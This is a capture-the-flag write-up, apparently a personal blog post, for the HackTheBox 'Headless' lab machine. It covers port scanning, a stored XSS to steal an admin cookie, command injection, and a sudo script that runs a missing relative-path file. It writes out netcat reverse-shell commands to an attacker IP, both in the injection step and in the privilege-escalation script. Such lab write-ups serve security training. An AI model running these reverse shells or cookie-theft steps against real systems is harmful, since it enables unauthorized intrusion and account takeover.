---
title: HackTheBox - Headless
date: 2024-08-05 18:09:00 +0800
categories:
  - hackthebox
tags:
  - ctf
---


### STEP 1 SCAN 

First of all, let's do an nmap scan with the following flag:

```nmap -p- -sC -sV -T4 10.10.11.8```

- -p- to scan all ports
- -sC to execute the default scripts
- -sV to see which services are running
- -T4 to to use a timing template to make our scan faster

With the output of our scan we can see we have 2 ports open:
![[nmap.png]]
- Port 22 for ssh(Secure Shell), this will not interest us because it is very rare to find a security vulnerability on the SSH protocol
- Port 5000 we have an http server, it will greatly interest us because we now know that we have to deal with a web server

Just open the browser with the following url 
https://<IP_TARGETED>:<PORT_NUMBER>

![[website1.png]]

### STEP 2 ENUMERATION

Now that we know we are dealing with a web server we can perform dirbusting to know the files of the website

I used gobuster for this with the following flags :
- dir for dirbusting(enumeration of the directories of the website)
- -u to specify the url targeted
- -w to specify the wordlist to use

Either the following command
``` gobuster dir -u http://10.10.11.8:5000/ -w /./usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt ```

With the following output of our gobuster command we can see we have only two directories for this website:
![[website2.png]]

When we're on the the website with the IP address following by the port is we click on the button "For questions" we're redirected on the directory /support 

We can not access the/dashboard because as a user we are not allowed, so it must be borne in mind that connection cookies will make full part of this challenge

### 3 STEP INTERACT LIKE A USER

Ok, now we're here
![[website3.png]]
If we complete each section and click on submit, nothing happens. 
In this case we can try to do an XSS(Cross Site Scripting) a persistent XSS (because we will inject malicious code form that will be injected and run in the browser of the victim)

Like this : 
![[website4.png]]

Now we have something is going on:
![[website5.png]]

Now that we’re done acting as a user, it’s time to put on the hacker hood to slip on your best goodie and launch burpsuite

###  STEP 4 TRY TO HAVE ACCESS TO DASHBOARD

Here, the objective is to get the cookie of the administrator to be able to connect to the dashboard, that’s why we will put our machine on listening on the port of our choice (here port 9001), to be able to receive the cookie from the administrator when his browser will load our form.

Use the following command to put your machine on listening.

```nc -lnvp 9001 ```

- nc stands for the tool netcat
- -l for listen mode
- -v for verbosity
- -n only for IP address
- -p to specify the specific port


Just launch burpsuite (if you're like what's that tool don't worry we can learn that [here](https://www.geeksforgeeks.org/what-is-burp-suite/))
![[burpsuite_off.png]]

You can enable request interception,
![[burpsuite_on.png]]
When we return our malicious request we can change the parameters here in this case the user agent parameter because the modification of the user agent does not change the data contained in the request.

We can find our xss payload [here](https://gist.github.com/leveled/2b5d2b2c458f553b17c65551487cee9b#file-xss-payload-steal-session-cookie) :
In the payload just replace by your IP address following by the port of your choice (here 9001)

Now we have what we are looking for :
![[burp1.png]]
 Now as we can see the admin cookie is our :
 ![[response_nc.png]]

In your browser now you can try to access to the dashboard directory, if you can't don't worry it is normal, the only thing you need to do is to go to the developer console of your browser and to enter in the Storage section --> Cookies section --> And to replace the value of the cookie present with that of our admin
![[cookie.png]]

### STEP 5 LET'S TAKE A FOOT IN THE MACHINE

Now from this dashboard we will see with the help of ntore ami burp suite what happens when we click on the button "Generate a report".

![[before_ci.png]]

we can see if there are a command injection ?

![[ci.png]]

That's right, we have a command injection.

What we’re going to do is we’re going to create a reverse shell and we’re going to url encode our command to make sure that our reverse shell works

That's our command, 

```nc 10.10.16.11 60000 -e /bin/bash ```

Now let's url encode:

nc%2010.10.16.11%2060000%20-e%20%2Fbin%2Fbash

you need before performing the command injection to listen on the port of your choice here port 60000

``` nc -lnvp 60000```

just put our command and send the request

![[ci2.png]]


Now we have one foot in the machine :
(We can have a better shell using the command 
```python3 -c 'import pty; pty.spawn("/bin/bash")'``` )

![[revshell1.png]]
We can now obtain our first flag
![[screenflag.png]]
Let's goo !!!! We're a user, ok now let's try to be root!!!

### STEP 6 : A PRIVILEGE ESCALATION MUST BE PERFORMED

with the command ```sudo -l```, let's which command we can run 
We have this output:

Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck

We need to have more information about this command syscheck
The bash code behind this command is as follows

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

this command execute an other file initdb.sh and that's very interesting because when you type 
```shell
find -type f -name "initdb.sh"
```
We can see we have no output the file "initdb.sh" doesn't exist then we can create it, let's go.

I jump in the folder /./tmp because we need to have full rights to create and modify our "initdb.sh" like this (We use the binary netcat to do a priviledge escalation):

```shell
echo '#!/bin/bash' > initdb.sh ; echo 'nc 10.10.16.11 60001 -e "/bin/bash"' >> initdb.sh
```

We just have to execute our command :

```shell
sudo syscheck
```

And as you can see :

![[root.png]]

Now you just have to cat the flag and GG you pwn the Headless Machine.

If you ever have the machine pwn in another way or you find my post incomplete do not hesitate to notify me via my twitter

Thank you for reading this post, have a good day.




















